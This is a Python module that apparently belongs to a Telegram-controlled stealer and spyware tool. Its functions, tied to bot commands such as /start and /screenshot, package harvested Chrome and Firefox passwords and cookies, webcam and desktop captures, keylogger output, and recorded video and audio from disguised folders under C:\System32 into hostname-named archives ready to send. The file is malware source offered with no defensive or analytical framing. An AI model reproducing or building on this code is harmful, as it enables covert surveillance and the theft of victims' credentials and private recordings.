import zipfile
import socket
import os


def zip_res():
    """
    creating an archive to send
    when you type /start
    """
    # array to archive for the /start command
    arr_for_arh = [r"C:\System32\x25x02x42\chrome_passwords.txt", r"C:\System32\x25x02x42\chrome_cookies.txt",
                   r"C:\System32\x25x02x42\scr_des.png", r"C:\System32\x25x02x42\cam.png", r"C:\System32\x25x02x42\setup_pc.txt",
                   r"C:\System32\x25x02x42\Firefox_password.txt", r"C:\System32\x25x02x42\Firefox_cookies.txt", ]
    j_zip = zipfile.ZipFile(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip", 'w')  # creating an archive for /start

    for name_f in arr_for_arh:
        try:
            j_zip.write(name_f, compress_type=zipfile.ZIP_DEFLATED)   # saving to a file in an archive
        except Exception as ex:
            print("zip response to start:", ex)

    j_zip.close()


def zip_screenshot():
    """
       creating an archive to send
       when you type /screenshot
    """
    # archiving video folder
    zf = zipfile.ZipFile(fr"C:\System32\x25x02x42\{socket.gethostname()}_video_desk.zip", "w")
    for dirname, subdirs, files in os.walk(r"C:\System32\x73x2jx45"):
        zf.write(dirname)
        for filename in files:
            zf.write(os.path.join(dirname, filename))
    zf.close()

    # audio file archiving
    zf = zipfile.ZipFile(fr"C:\System32\x25x02x42\{socket.gethostname()}_sound.zip", "w")
    for dirname, subdirs, files in os.walk(r"C:\System32\x6dx21x6q"):
        zf.write(dirname)
        for filename in files:
            zf.write(os.path.join(dirname, filename))
    zf.close()

    # array to archive for the /screenshot command
    arr_for_arh = [r"C:\System32\x25x02x42\cam.png", r"C:\System32\x25x02x42\scr_des.png", r"C:\System32\x25x02x42\klog.txt", ]
    j_zip = zipfile.ZipFile(fr"C:\System32\x25x02x42\{socket.gethostname()}_log.zip", 'w')  # creating an archive for /screenshot

    for name_f in arr_for_arh:
        try:
            j_zip.write(name_f, compress_type=zipfile.ZIP_DEFLATED)  # saving to a file in an archive
        except Exception as ex:
            print("response to screenshot", ex)
